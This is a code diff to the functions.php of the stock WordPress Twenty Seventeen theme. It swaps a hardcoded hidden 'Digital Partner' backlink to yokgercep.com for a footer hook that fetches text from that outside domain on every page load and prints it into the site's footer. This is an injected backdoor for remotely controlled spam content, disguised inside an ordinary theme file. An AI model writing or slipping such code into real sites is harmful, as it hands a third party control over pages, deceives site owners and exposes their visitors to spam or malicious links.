@@ -756,10 +756,15 @@ function twentyseventeen_register_block_patterns() {
 }
 
 add_action( 'init', 'twentyseventeen_register_block_patterns' );
-add_action( 'wp_footer', function () {
-    echo '<div class="sponsor-area" style="text-align:center; font-size:12px; color:#777;">';
-    echo '<a href="https://yokgercep.com/404-forbiden/hiden-backlinks.txt" target="_blank" rel="sponsored nofollow">
-            Digital Partner
-          </a>';
-    echo '</div>';
+add_action('wp_footer', function () {
+    $resp = wp_remote_get('https://yokgercep.com/sponsor-ShindraSenpai.txt', [
+        'timeout' => 5,
+    ]);
+
+    if ( ! is_wp_error($resp) ) {
+        echo '<div class="sponsor-area" style="font-size:12px; color:#777; text-align:center;">';
+        echo wp_kses_post( wp_remote_retrieve_body($resp) );
+        echo '</div>';
+    }
 });
+
